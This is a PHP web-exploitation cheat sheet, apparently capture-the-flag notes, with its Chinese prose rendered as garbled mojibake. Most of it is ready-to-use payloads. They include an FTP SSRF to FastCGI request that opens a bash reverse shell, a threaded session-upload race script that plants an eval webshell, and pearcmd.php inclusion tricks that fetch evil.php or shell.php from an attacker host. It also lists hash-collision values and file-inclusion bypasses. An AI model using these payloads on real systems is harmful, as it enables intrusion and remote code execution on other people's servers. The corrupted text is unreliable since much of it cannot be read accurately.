Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)conn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() å¯åŠ¨æœåŠ¡å™¨ä¹‹åå†ç›‘å¬åå¼¹çš„ç«¯å£ï¼š http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00 å‚è€ƒï¼šæ•™ä½ ç”¨ FTP SSRF æ‰“ç©¿å†…ç½‘ arrayç»•è¿‡å…³é”®å­— file_put_contentsçš„dataå‚æ•°å¯ä»¥æ˜¯ä¸ªarrayï¼Œå¯ä»¥é€šè¿‡æ„é€ ç‰¹åˆ«çš„getè¯·æ±‚æ¥å‘é€ä¸€ä¸ªdataçš„arrayæ¥ç»•è¿‡ã€‚ file_put_contents(file,data,mode,context) file: å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚ data: å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚ 12for i in range(len(s)): params[&#x27;data[&#123;i&#125;]&#x27;.format(i=str(i))]=bytes([s[i]]) sha1()æ¯”è¾ƒ ä»¥æ•°ç»„ä¸ºå‚æ•° sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œå°†æŠ¥é”™å¹¶è¿”å›falseã€‚ ç‰¹æ®Šæƒ…å†µæ±‡æ€» 10932435112: 0e07766915004133176347055865026311692244aaroZmOk: 0e66507019969427134894567494305185566735aaK1STfY: 0e76658526655756207688271159624026011393aaO8zKZF: 0e89257456677279068558073954252716165668aa3OFF9m: 0e36977786278517984959260394024281014729 0e1290633704: 0e19985187802402577070739524195726831799 æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™===å¼ºç±»å‹æƒ…å†µï¼‰ ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼ï¼š 12a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 md5()æ¯”è¾ƒ æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™==å¼±ç±»å‹æƒ…å†µï¼‰ QNKCDZO - 0e830400451993494058024219903391 PJNPDWY: 0e291529052894702774557631701704NWWKITQ: 0e763082070976038347657360817689NOOPCJF: 0e818888003657176127862245791911MMHUWUV: 0e701732711630150438129209816536MAUXXQC: 0e478478466848439040434801845361IHKFRNS: 0e256160682445802696926137988570GZECLQZ: 0e537612333747236407713628225676GGHMVOE: 0e362766013028313274586933780773GEGHBXL: 0e248776895502908863709684713578EEIZDOI: 0e782601363539291779881938479162DYAXWCA: 0e424759758842488633464374063001DQWRASX: 0e742373665639232907775599582643BRTKUJZ: 00e57640477961333848717747276704ABJIHVY: 0e755264355178451322893275696586 240610708 - 0e462097431906509019562988736854s878926199a - 0e545993274517709034328855841020s155964671a - 0e342768416822451524974117254469s214587387a - 0e848240448830537924465865611904s878926199a - 0e545993274517709034328855841020s1091221200a - 0e940624217856561557816327384675 aaaXXAYW: 0e540853622400160407992788832284aabg7XSs: 0e087386482136013740957780965295aabC9RqS: 0e041022518165728065344349536299 0e215962017 - 0e291242476940776845150308577824 æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™===å¼ºç±»å‹æƒ…å†µï¼‰ å·¥å…·ï¼šfastcoll ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼ï¼š 123a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 ä»¥æ•°ç»„ä¸ºå‚æ•° md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ NaN å’Œ INF NANå’ŒINFï¼Œåˆ†åˆ«ä¸ºéæ•°å­—å’Œæ— ç©·å¤§ï¼Œä½†æ˜¯var_dumpä¸€ä¸‹å®ƒä»¬çš„æ•°æ®ç±»å‹å´æ˜¯doubleï¼Œé‚£ä¹ˆåœ¨md5å‡½æ•°å¤„ç†å®ƒä»¬çš„æ—¶å€™ï¼Œæ˜¯å°†å…¶ç›´æ¥è½¬æ¢ä¸ºå­—ç¬¦ä¸²â€NANâ€å’Œå­—ç¬¦ä¸²â€INFâ€ä½¿ç”¨çš„ï¼Œä½†æ˜¯å®ƒä»¬æ‹¥æœ‰ç‰¹æ®Šçš„æ€§è´¨ï¼Œå®ƒä»¬ä¸ä»»ä½•æ•°æ®ç±»å‹ï¼ˆé™¤äº†trueï¼‰åšå¼ºç±»å‹æˆ–å¼±ç±»å‹æ¯”è¾ƒå‡ä¸ºfalseï¼Œç”šè‡³NAN===NANéƒ½æ˜¯falseï¼Œä½†md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)ä¸ºtrueã€‚ md5(string,raw) md5(string,raw) string å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚raw å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSE - é»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚ ffifdyopï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º &#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cï¼› 129581926211651571912466741651878684928ï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#39;or&#39;8ï¼› create_function() ä»£ç æ³¨å…¥ æºç  $func(&#39;&#39;,$arg) ï¼š $func=&#39;create_function&#39;; $arg=&#39;2;&#125;phpinfo();//&#39; æˆ– $arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());// è¿”å›å€¼ï¼šåŒ¿åå‡½æ•° $func = create_function(&quot;&quot;,&quot;die(&#39;end.&#39;);&quot;); åˆ›å»ºä¸€ä¸ª$funcçš„åŒ¿åå‡½æ•°ï¼Œå‡½æ•°çš„ä½œç”¨æ˜¯è¾“å‡ºå­—ç¬¦ä¸²ã€‚ åŒ¿åå‡½æ•°æœ‰çœŸæ­£çš„åå­—ï¼Œä¸º%00lambda_%d ï¼ˆ%dæ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬nä¸ªåŒ¿åå‡½æ•°ï¼Œnçš„èŒƒå›´0-999ï¼‰ call_user_func() è°ƒç”¨ç±»é™æ€æ–¹æ³• call_user_func(&#39;Func::_One&#39;,&#39;one&#39;) call_user_func([&#39;Func&#39;,&#39;_One&#39;]) å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1411010 escapeshellarg() escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ã€‚ ä¸å¯è§å­—ç¬¦æ’å…¥ï¼ˆ%80-%ffï¼‰ escapeshellcmd() escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ï¼›åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \\x0A, \\xFFï¼›&#39; å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ï¼›åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ escapeshellarg()+escapeshellcmd() é…å¯¹ï¼š å¤šä¸ªå‚æ•°æ³¨å…¥ï¼šPHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡ ereg() / eregi() NULLæˆªæ–­æ¼æ´ ereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´,å¯ä»¥%00æˆªæ–­ï¼Œé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼çš„æ£€æŸ¥ã€‚ ereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²çš„ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULLã€‚ strpos() ä»¥æ•°ç»„ä¸ºå‚æ•° strpos()å‡½æ•°å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¾¿ä¼šè¿”å›NULLã€‚ äºŒæ¬¡ç¼–ç ç»•å…³é”®å­— å‚è€ƒï¼šhttps://bugs.php.net/bug.php?id=76671 strcmp() å‡½æ•°ç¼ºé™· strcmp()å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²(åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå®šä¹‰ä¸­æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä½†å¦‚æœè¾“å…¥å…¶ä»–ç±»å‹è¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ä¸­è¯´åˆ°åœ¨php 5.2ç‰ˆæœ¬ä¹‹å‰ï¼Œåˆ©ç”¨strcmpå‡½æ•°å°†æ•°ç»„ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒä¼šè¿”å›-1ï¼Œä½†æ˜¯ä»5.3å¼€å§‹ï¼Œä¼šè¿”å›0ã€‚ add_slashes() $&#123;phpinfo()&#125; preg_replace() ä»£ç æ‰§è¡Œï¼ˆé™/eæ¨¡å¼ï¼‰ preg_replace(PHP 5.5)åŠŸèƒ½ ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢å®šä¹‰ ï¼š mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ replacement è¿›è¡Œæ›¿æ¢$pattern å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ preg_replace() å°† $replacement å½“åšphpä»£ç æ¥æ‰§è¡Œ filter_var() FILTER_VALIDATE_EMAIL å½¢å¼ï¼šlocal-part@domain-part é‚®ç®±local-partéƒ¨åˆ†å¯ä»¥ç”¨åŒå¼•å·åŒ…è£¹ï¼ŒåŒå¼•å·å†…å³å¯å¡«å…¥ä»»æ„å­—ç¬¦ï¼Œå¦‚&quot;Joe&#39;Blow&quot;@example.com FILTER_VALIDATE_URL 0://www.baidu.com; is_file() / file_exists() è¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼š ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php require_once() åŒ…å«çš„è½¯è¿æ¥å±‚æ•°è¾ƒå¤šæ—¶ï¼ŒhashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼ŒåŒ is_file() å‚è€ƒï¼šphpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶ include() æ—¥å¿—åŒ…å« URLï¼š?x=/var/log/nginx/access.log ä¿®æ”¹User-Agentä¸º&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt; æœ‰åç¼€ç»•è¿‡ ?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt; ?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4 ?c=data:,&lt;?php system(&#39;ls&#39;)?&gt; zip/pharåè®®åŒ…å«ï¼ˆæœ‰ç‰¹å®šåç¼€ï¼‰ è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºéªŒè¯åŒ…å«æ–‡ä»¶ä¸ºç‰¹å®šåç¼€æ—¶ã€‚ zip é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªphpè„šæœ¬ã€‚ ç„¶åæ„é€ zip://php.zip#php.jpgï¼š http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg phar (PHPç‰ˆæœ¬&gt;5.3.0) é¦–å…ˆè¦ç”¨pharç±»æ‰“åŒ…ä¸€ä¸ªpharæ ‡å‡†åŒ…ï¼š 1234&lt;?php$p = new PharData(dirname(__FILE__).&#x27;./test.zip&#x27;, 0,&#x27;test&#x27;,Phar::ZIP);$p-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt; ä¼šç”Ÿæˆä¸€ä¸ªzipçš„å‹ç¼©æ–‡ä»¶ã€‚ç„¶åæ„é€  http://127.0.0.1/file.php?file=phar://php.zip/php.jpg åˆ©ç”¨session.upload_progress å¯ä»¥åˆ©ç”¨session.upload_progresså°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚å‰æéœ€è¦çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚ å¦‚æœsession.auto_start=On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ sessionæœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=TGAOï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_TGAOã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±ini.get(&quot;session.upload_progress.prefix&quot;)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚ é»˜è®¤é…ç½®session.upload_progress.cleanup = onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚ å‚è€ƒï¼šhttps://www.freebuf.com/vuls/202819.html å¸¸è§PHP-Sessionå­˜æ”¾ä½ç½® 12345/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED 12345678910111213141516171819202122232425262728#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;Q&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;cat fl0g.php&#x27;);&quot;&#125;url = &#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;q.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessid,data=data) if &#x27;q.txt&#x27; in resp.text: print(resp.text) event.clear() else: #print(&quot;[+++++++++++++]retry&quot;) passif __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() åˆ©ç”¨PEAR ï¼ˆå¼€å¯register_argc_argvï¼‰ å¯èƒ½è·¯å¾„ï¼š 12/usr/local/lib/php/pearcmd.php /usr/share/pear/pearcmd.php PEARæ˜¯å¯é‡ç”¨çš„PHPç»„ä»¶æ¡†æ¶å’Œç³»ç»Ÿåˆ†å‘ï¼Œä¼šéšPHPå®‰è£…æ—¶è‡ªåŠ¨å®‰è£…ã€‚ ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/eval.php ?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1ï¼ˆBurpsuiteé˜²æµè§ˆå™¨è½¬ç ï¼‰ ?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php ï¼ˆè·¯å¾„ï¼š/tmp/pear/download/evil.phpï¼‰ ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?eval($_POST[0]);?&gt;+/tmp/hello.phpï¼ˆè·¯å¾„ï¼š/tmp/hello.phpï¼‰ 1234567 &lt;?phpheader(&#x27;Content-Disposition: attachment; filename=&quot;shell.php&quot;&#x27;); echo &lt;&lt;&lt;EOF&lt;?phpsystem(\\$_GET[0]);?&gt;EOF; ?file=/tmp/pear/download/shell.php&amp;0=/readflag â€‹ die() / exit()å‚è€ƒï¼šhttps://www.anquanke.com/post/id/202510 è¿‡æ»¤å…³é”®è¯ urlencode è¿‡æ»¤%25 äºŒæ¬¡ç¼–ç ï¼ša:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35 allow_url_include=Off file_get_contents å…è®¸ä½¿ç”¨ data URIï¼Œä¼šç›´æ¥è¿”å›åé¢çš„å†…å®¹ï¼Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ allow_url_include=Off çš„æƒ…å†µä¸‹ï¼Œä¸å…è®¸ require_once data URI çš„ï¼Œä½†æ˜¯å¦‚æœ data:,XXX æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯ï¼Œå°±ä¼šæ”¾å¼€é™åˆ¶ã€‚ 12345678$ php -aInteractive mode enabledphp &gt; echo file_get_contents(&#x27;data:,123456/ricky&#x27;);123456/rickyphp &gt; echo require_once(&#x27;data:,123456/ricky&#x27;);flag&#123;xxxxxxxxxx&#125;php &gt; open()PHPåŸç”Ÿç±»ï¼šZipArchive::open($filename,$flags) è°ƒç”¨å¯åˆ é™¤æ–‡ä»¶ï¼šZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)=ZipArchive::open(&#39;xxx&#39;,8) parse_url()å‚è€ƒï¼šhttps://www.cnblogs.com/tr1ple/p/11137159.html //ç»•è¿‡ æŠŠ//è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆPHP&lt;5.4.7ï¼‰ã€‚ å¦‚æœæ˜¯//ï¼Œåˆ™è¢«è§£ææˆhostï¼Œåé¢çš„å†…å®¹å¦‚æœæœ‰/ï¼Œè¢«è§£æå‡ºpathï¼Œè€Œä¸æ˜¯queryäº†ã€‚ ///ç»•è¿‡ ä¸‰ä¸ªæ–œæ å¯¼è‡´ä¸¥é‡ä¸åˆæ ¼çš„URLï¼Œparse_url() è¿”å›FALSEã€‚ basename()è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚ var_dump(basename(&quot;\\xffconfig.php&quot;)); =&gt; config.php var_dump(basename(&quot;config.php\\xff&quot;)); =&gt; config.php spl_autoload_register()PHPæ¡†æ¶ä¸­æœ‰è‡ªåŠ¨åŠ è½½æœºåˆ¶ï¼Œautoloadæœºåˆ¶å¯ä»¥ä½¿å¾—PHPç¨‹åºæœ‰å¯èƒ½åœ¨ä½¿ç”¨ç±»æ—¶æ‰è‡ªåŠ¨åŒ…å«ç±»æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€å¼€å§‹å°±å°†æ‰€æœ‰çš„ç±»æ–‡ä»¶includeè¿›æ¥ï¼Œè¿™ç§æœºåˆ¶ä¹Ÿç§°ä¸ºlazy loadingã€‚ autoloadå¤§è‡´å¯ä»¥ä½¿ç”¨ä¸¤ç§æ–¹æ³•ï¼š__autoload å’Œ spl æ–¹æ³•ã€‚ splçš„autoloadç³»åˆ—å‡½æ•°ä½¿ç”¨ä¸€ä¸ªautoloadè°ƒç”¨å †æ ˆï¼Œå¯ä»¥ä½¿ç”¨ spl_autoload_register æ³¨å†Œå¤šä¸ªè‡ªå®šä¹‰çš„autoloadå‡½æ•°ã€‚ spl_autoload_register() å¦‚æœä¸æŒ‡å®šå‚æ•°ï¼Œå°±ä¼šè‡ªåŠ¨åŒ…å« ç±»å.php æˆ– ç±»å.inc çš„æ–‡ä»¶ï¼Œå¹¶åŠ è½½å…¶ä¸­çš„â€œç±»åâ€ç±»ã€‚ a. ä¸Šä¼ webshellï¼Œåç¼€ä¸º .incï¼Œè¢«é‡å‘½åä¸º xxxx.incï¼› b. åºåˆ—åŒ–ä¸€ä¸ªç±»åä¸º xxxx çš„ç±»å¯¹è±¡ï¼› c. å°†åºåˆ—åŒ–ä»¥åçš„å­—ç¬¦ä¸²ä½œä¸ºcookieï¼Œå‘é€åˆ°æœåŠ¡å™¨ä¸Šï¼› d. æœåŠ¡å™¨ååºåˆ—åŒ–è¿™ä¸ªå­—ç¬¦ä¸²åï¼Œå°†ä¼šè‡ªåŠ¨åŠ è½½ xxxx ç±»ï¼Œç”±äºä¹‹å‰ spl_autoload_register å‡½æ•°æ³¨å†Œçš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨åŠ è½½ xxxx.incï¼Œä»è€Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ 123&lt;?phpspl_autoload_register(&#x27;system&#x27;);new ls(); å½“ spl_autoload_register çš„å‚æ•°ä¸ä¸ºç©ºæ—¶ï¼Œnewä¸€ä¸ªç±» lsï¼Œå¦‚æœè¯¥ ls ç±»æœªå®šä¹‰ï¼Œç¨‹åºä¼šå¯»æ‰¾system å‡½æ•°ï¼Œå¹¶å°† ls ä½œä¸ºå‚æ•°ï¼Œæ‰§è¡Œ system å‡½æ•°ï¼Œå³æ‰§è¡Œäº† system(&#39;ls&#39;);ã€‚ å½“ spl_autoload_register çš„å‚æ•°ä¸ºç©ºæ—¶ã€‚ç„¶ånewä¸€ä¸ªxxxç±»ï¼Œå¦‚æœè¯¥xxxç±»æœªå®šä¹‰ï¼Œç¨‹åºä¼šåœ¨å·¥ä½œç©ºé—´ä¸­å¯»æ‰¾ xxx.php æˆ– xxx.incï¼Œå¹¶å°†å…¶åŒ…å«ã€‚ ini_setini_set($name,$value); =&gt; name=error_log&amp;value=/var/www/html/out.php å‚æ•°ç‰¹æ€§ å‚æ•°ä¸­çš„+ã€[ã€ç©ºæ ¼ã€.å‡ä¼šå˜ä¸º_ å‚æ•°å½¢å¼A_B.Cï¼šä½¿ç”¨A[B.Cä¼ å…¥ â€‹ æ— å­—æ¯/æ•°å­—/ç‰¹å®šç¬¦å·RCE å–åï¼ˆ~ï¼‰ phpinfo() â†’ (~%8F%97%8F%96%91%99%90)() system(&#39;ls&#39;) â†’ 